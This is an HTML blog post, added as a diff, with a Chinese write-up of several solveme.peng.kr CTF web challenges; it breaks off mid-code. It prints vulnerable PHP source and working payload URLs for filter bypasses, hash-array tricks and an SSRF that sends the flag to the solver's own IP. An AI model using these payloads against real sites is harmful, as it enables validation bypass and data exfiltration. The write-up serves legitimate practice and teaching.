@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="UA-100684831-1">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"kele1997.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="solveme writeup 题目地址:http:&#x2F;&#x2F;solveme.peng.kr&#x2F; Warm up http:&#x2F;&#x2F;warmup.solveme.peng.kr&#x2F; 1234567    error_reporting(0);    require __DIR__.&#39;&#x2F;lib.php&#39;;    echo base64_encode(hex2bin(strrev(bin2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="solveme 部分 writeup">
+<meta property="og:url" content="https://kele1997.github.io/2018/03/15/2018-3-15-solveme-writeup/index.html">
+<meta property="og:site_name" content="可乐的博客">
+<meta property="og:description" content="solveme writeup 题目地址:http:&#x2F;&#x2F;solveme.peng.kr&#x2F; Warm up http:&#x2F;&#x2F;warmup.solveme.peng.kr&#x2F; 1234567    error_reporting(0);    require __DIR__.&#39;&#x2F;lib.php&#39;;    echo base64_encode(hex2bin(strrev(bin2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://or4d8nhvk.bkt.clouddn.com/18-3-15/91338844.jpg">
+<meta property="og:image" content="http://or4d8nhvk.bkt.clouddn.com/18-3-15/75502001.jpg">
+<meta property="og:image" content="http://or4d8nhvk.bkt.clouddn.com/18-3-15/5077641.jpg">
+<meta property="og:image" content="http://or4d8nhvk.bkt.clouddn.com/18-3-15/18370928.jpg">
+<meta property="og:image" content="http://or4d8nhvk.bkt.clouddn.com/18-3-15/37203254.jpg">
+<meta property="og:image" content="http://or4d8nhvk.bkt.clouddn.com/2018-03-19-22-53-14-2018319.png">
+<meta property="og:image" content="http://or4d8nhvk.bkt.clouddn.com/2018-03-20-07-29-26-2018320.png">
+<meta property="og:image" content="http://or4d8nhvk.bkt.clouddn.com/2018-03-20-08-38-01-2018320.png">
+<meta property="og:image" content="http://or4d8nhvk.bkt.clouddn.com/2018-03-20-08-40-41-2018320.png">
+<meta property="og:image" content="http://or4d8nhvk.bkt.clouddn.com/2018-03-20-08-43-38-2018320.png">
+<meta property="og:image" content="http://or4d8nhvk.bkt.clouddn.com/2018-03-20-08-46-46-2018320.png">
+<meta property="article:published_time" content="2018-03-15T22:41:35.000Z">
+<meta property="article:modified_time" content="2020-11-23T10:12:28.221Z">
+<meta property="article:author" content="Kele">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="solveme">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://or4d8nhvk.bkt.clouddn.com/18-3-15/91338844.jpg">
+
+<link rel="canonical" href="https://kele1997.github.io/2018/03/15/2018-3-15-solveme-writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>solveme 部分 writeup | 可乐的博客</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-100684831-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-100684831-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">可乐的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://kele1997.github.io/2018/03/15/2018-3-15-solveme-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Kele">
+      <meta itemprop="description" content="菜鸡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="可乐的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          solveme 部分 writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-03-15 22:41:35" itemprop="dateCreated datePublished" datetime="2018-03-15T22:41:35+00:00">2018-03-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-23 10:12:28" itemprop="dateModified" datetime="2020-11-23T10:12:28+00:00">2020-11-23</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>9.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="solveme-writeup">solveme writeup</h1>
+<p>题目地址:http://solveme.peng.kr/</p>
+<h2 id="warm-up">Warm up</h2>
+<p>http://warmup.solveme.peng.kr/</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(hex2bin(strrev(bin2hex($flag)))), &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY&#x3D;</span><br></pre></td></tr></table></figure>
+<p><img src="http://or4d8nhvk.bkt.clouddn.com/18-3-15/91338844.jpg" /></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        &#x2F;&#x2F;Enter your code here, enjoy!</span><br><span class="line">    &#x2F;&#x2F;谨慎了一下下</span><br><span class="line">    $code&#x3D;&quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY&#x3D;&quot;;</span><br><span class="line">    $temp&#x3D;base64_decode($code);</span><br><span class="line">    &#x2F;&#x2F;echo $temp;</span><br><span class="line">    var_dump($temp);</span><br><span class="line">    $temp&#x3D;bin2hex($temp);</span><br><span class="line">    var_dump($temp);</span><br><span class="line">    $temp&#x3D;strrev($temp);</span><br><span class="line">    var_dump($temp);</span><br><span class="line">    $temp&#x3D;hex2bin($temp);</span><br><span class="line">    var_dump($temp);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#python</span><br><span class="line">from binascii import hexlify,unhexlify</span><br><span class="line">import base64</span><br><span class="line">code&#x3D;&quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY&#x3D;&quot;</span><br><span class="line">temp&#x3D;base64.b64decode(code)</span><br><span class="line">temp&#x3D;hexlify(temp)</span><br><span class="line">temp&#x3D;temp[::-1]</span><br><span class="line">temp&#x3D;unhexlify(temp)</span><br><span class="line">print temp</span><br></pre></td></tr></table></figure>
+<h2 id="bad-compare">Bad compare</h2>
+<p>http://badcompare.solveme.peng.kr/<br />
+假如你没有安装set character encoding(chrome应用)的话，是看到的代码是这个样子的<br />
+<img src="http://or4d8nhvk.bkt.clouddn.com/18-3-15/75502001.jpg" /> 假如你安装了，回事这个样子的 <img src="http://or4d8nhvk.bkt.clouddn.com/18-3-15/5077641.jpg" /> 但是这个answer值不能直接提交，因为url参数传递的原因，这个参数会被转码，所以我们应该用16进制url编码的形式提交，所以掏出burpsuite repeater</p>
+<p><img src="http://or4d8nhvk.bkt.clouddn.com/18-3-15/18370928.jpg" /></p>
+<p>把这个字符串发送到decode里面去，然后url编码<br />
+<img src="http://or4d8nhvk.bkt.clouddn.com/18-3-15/37203254.jpg" /><br />
+最后提交即可</p>
+<p>** 注意 ** 选择那串奇怪文本的时候有可能选中引号，所以最后去掉多余(开头或者结尾)的%27 payload=<code>http://badcompare.solveme.peng.kr/?answer=%f0%ee%c2%f5%d3%fa%e5%f1%d7%cc</code></p>
+<h2 id="winter-sleep">Winter sleep</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#39;time&#39;]))&#123;&#x2F;&#x2F;获得时间参数，是字符串类型</span><br><span class="line"></span><br><span class="line">        if(!is_numeric($_GET[&#39;time&#39;]))&#123;&#x2F;&#x2F;判断time参数内容是不是数字</span><br><span class="line">            echo &#39;The time must be number.&#39;;</span><br><span class="line"></span><br><span class="line">        &#125;else if($_GET[&#39;time&#39;] &lt; 60 * 60 * 24 * 30 * 2)&#123;&#x2F;&#x2F;time的秒数要小于两个月5184000</span><br><span class="line">            echo &#39;This time is too short.&#39;;</span><br><span class="line"></span><br><span class="line">        &#125;else if($_GET[&#39;time&#39;] &gt; 60 * 60 * 24 * 30 * 3)&#123;&#x2F;&#x2F;time的秒数要大于一个月7776000</span><br><span class="line">            echo &#39;This time is too long.&#39;;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            sleep((int)$_GET[&#39;time&#39;]);&#x2F;&#x2F;time参数int类型强制转换，可以使用科学计数法6e6</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>int() 类型将字符串转换成数字的时候，后一直读取到字符串不是数字为止<br />
+举个例子：<code>int("abc")=0</code> <code>int("1sss")=1</code></p>
+<h2 id="hard-login">Hard login</h2>
+<p>参考了大佬的博客，说是越权。。。。。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    session_start();</span><br><span class="line">    require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#39;username&#39;], $_GET[&#39;password&#39;]))&#123;</span><br><span class="line"></span><br><span class="line">        if(isset($_SESSION[&#39;hard_login_check&#39;]))&#123;</span><br><span class="line">            echo &#39;Already logged in..&#39;;</span><br><span class="line"></span><br><span class="line">        &#125;else if(!isset($_GET[&#39;username&#39;]&#123;3&#125;) || strtolower($_GET[&#39;username&#39;]) !&#x3D; $hidden_username)&#123;</span><br><span class="line">            echo &#39;Wrong username..&#39;;</span><br><span class="line"></span><br><span class="line">        &#125;else if(!isset($_GET[&#39;password&#39;]&#123;7&#125;) || $_GET[&#39;password&#39;] !&#x3D; $hidden_password)&#123;</span><br><span class="line">            echo &#39;Wrong password..&#39;;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $_SESSION[&#39;hard_login_check&#39;] &#x3D; true;</span><br><span class="line">            echo &#39;Login success!&#39;;</span><br><span class="line">            header(&#39;Location: .&#x2F;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure> <code>curl http://hardlogin.solveme.peng.kr/index.php</code>得到flag</p>
+<h2 id="url-filtering">URL filtering</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&quot;&#x2F;lib.php&quot;;</span><br><span class="line"></span><br><span class="line">    $url &#x3D; urldecode($_SERVER[&#39;REQUEST_URI&#39;]);</span><br><span class="line">    $url_query &#x3D; parse_url($url, PHP_URL_QUERY);&#x2F;&#x2F;关键点在于parse_url,假如url是无效的，那么就会直接返回false,下面的验证全部跳过</span><br><span class="line"></span><br><span class="line">    $params &#x3D; explode(&quot;&amp;&quot;, $url_query);</span><br><span class="line">    foreach($params as $param)&#123;</span><br><span class="line"></span><br><span class="line">        $idx_equal &#x3D; strpos($param, &quot;&#x3D;&quot;);</span><br><span class="line">        if($idx_equal &#x3D;&#x3D;&#x3D; false)&#123;</span><br><span class="line">            $key &#x3D; $param;</span><br><span class="line">            $value &#x3D; &quot;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $key &#x3D; substr($param, 0, $idx_equal);</span><br><span class="line">            $value &#x3D; substr($param, $idx_equal + 1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(strpos($key, &quot;do_you_want_flag&quot;) !&#x3D;&#x3D; false || strpos($value, &quot;yes&quot;) !&#x3D;&#x3D; false)&#123;</span><br><span class="line">            die(&quot;no hack&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#39;do_you_want_flag&#39;]) &amp;&amp; $_GET[&#39;do_you_want_flag&#39;] &#x3D;&#x3D; &quot;yes&quot;)&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Note:</p>
+<p>parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///...）。其它任何协议都不能这样。</p>
+</blockquote>
+<p>假如url是中带三个斜线就可以直接返回false，绕过验证，但是do_you_want_flag参数确实可以解析的<br />
+payload: <code>http://urlfiltering.solveme.peng.kr///index.php?do_you_want_flag=yes</code></p>
+<h2 id="hash-collision">Hash collision</h2>
+<p>常见的绕过hash方法，使用数组变量，hash之后返回null<br />
+payload: <code>http://hashcollision.solveme.peng.kr/?foo[]=asss&amp;bar[]=wwww</code></p>
+<h2 id="array2string">array2string</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">    $value &#x3D; $_GET[&#39;value&#39;];</span><br><span class="line"></span><br><span class="line">    $username &#x3D; $_GET[&#39;username&#39;];</span><br><span class="line">    $password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line"></span><br><span class="line">    for ($i &#x3D; 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        if ($_GET[&#39;username&#39;]) unset($username);</span><br><span class="line">        if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">        else $username .&#x3D; chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        if ($username &#x3D;&#x3D; &#39;15th_HackingCamp&#39; &amp;&amp; md5($password) &#x3D;&#x3D; md5(file_get_contents(&#39;.&#x2F;secret.passwd&#39;))) &#123;</span><br><span class="line">            echo &#39;Hello &#39;.$username.&#39;!&#39;, &#39;&lt;br&gt;&#39;, PHP_EOL;</span><br><span class="line">            echo $flag, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>确实想了挺长时间 ] password的路径给了，url输入直接读取出来<code>simple_passw0rd</code> <img src="http://or4d8nhvk.bkt.clouddn.com/2018-03-19-22-53-14-2018319.png" alt="2018-03-19-22-53-14-2018319" /><br />
+chr的参数在大于256的时候会自动取余，所以我们get了<br />
+payload: <code>http://array2string.solveme.peng.kr/index.php?value[0]=305&amp;value[1]=309&amp;value[2]=372&amp;value[3]=360&amp;value[4]=351&amp;value[5]=328&amp;value[6]=353&amp;value[7]=355&amp;value[8]=363&amp;value[9]=361&amp;value[10]=366&amp;value[11]=359&amp;value[12]=323&amp;value[13]=353&amp;value[14]=365&amp;value[15]=368&amp;password=simple_passw0rd</code><br />
+ps:下标可以省略</p>
+<h2 id="give-me-a-link">give me a link</h2>
+<p>这个题目超级难。。。。。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#39;url&#39;]))&#123;</span><br><span class="line">        $url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line"></span><br><span class="line">        if(preg_match(&#39;&#x2F;_|\s|\0&#x2F;&#39;, $url))&#123;&#x2F;&#x2F;过滤掉了&#39;_&#39;</span><br><span class="line">            die(&#39;Not allowed character&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!preg_match(&#39;&#x2F;^https?\:\&#x2F;\&#x2F;&#39;.$_SERVER[&#39;HTTP_HOST&#39;].&#39;&#x2F;i&#39;, $url))&#123;   &#x2F;&#x2F;url参数中含有host地址https:&#x2F;&#x2F;givemealink.solveme.peng.kr</span><br><span class="line">            die(&#39;Not allowed URL&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse &#x3D; parse_url($url);</span><br><span class="line">        if($parse[&#39;path&#39;] !&#x3D;&#x3D; &#39;&#x2F;plz_give_me&#39;)&#123;&#x2F;&#x2F;url路径中含有plz_give_me</span><br><span class="line">            die(&#39;Not allowed path&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ch &#x3D; curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $parse[&#39;scheme&#39;].&#39;:&#x2F;&#x2F;&#39;.$parse[&#39;host&#39;].&#39;&#x2F;&#39;.$flag);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">        curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        echo &#39;Okay, I sent the flag.&#39;, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure> <img src="http://or4d8nhvk.bkt.clouddn.com/2018-03-20-07-29-26-2018320.png" alt="2018-03-20-07-29-26-2018320" /><br />
+'<em>'可以使用无效字符绕过<br />
+** RFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-</em>.~4个特殊字符以及所有保留字符。** 保留字符有<code>! *   '   (   )   ;   :   @   &amp;   =   +   $   ,   /   ?   #   [   ]</code><br />
+其他的都是无效字符，例子中我是用%10无效字符<br />
+url中必须有host地址，这个可以通过http认证来绕过<br />
+<code>http://username:password@www.test.com</code> payload: <code>http://givemealink.solveme.peng.kr/?url=https://givemealink.solveme.peng.kr:1@{自己的ip}/plz%10give%10me</code><br />
+然后flag会发送到你自己的主机上面，但是只是一条get访问的形式，所以可以到/var/log/目录下面，用<code>grep flag *</code>进行查找</p>
+<h2 id="give_me_a_link2">give_me_a_link2</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#39;url&#39;]))&#123;</span><br><span class="line">        $url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line"></span><br><span class="line">        if(preg_match(&#39;&#x2F;_|\s|\0&#x2F;&#39;, $url))&#123;</span><br><span class="line">            die(&#39;Not allowed character&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse &#x3D; parse_url($url);</span><br><span class="line">        if(!preg_match(&#39;&#x2F;^https?$&#x2F;i&#39;, $parse[&#39;scheme&#39;]))&#123;</span><br><span class="line">            die(&#39;Not allowed scheme&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!preg_match(&#39;&#x2F;^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$&#x2F;i&#39;, $parse[&#39;host&#39;]))&#123;</span><br><span class="line">            die(&#39;Not allowed host&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!preg_match(&#39;&#x2F;\&#x2F;plz_give_me$&#x2F;&#39;, $parse[&#39;path&#39;]))&#123;</span><br><span class="line">            die(&#39;Not allowed path&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $socket &#x3D; socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">        if($socket &#x3D;&#x3D;&#x3D; false)&#123;</span><br><span class="line">            die(&#39;Failed to create socket&#39;);</span><br><span 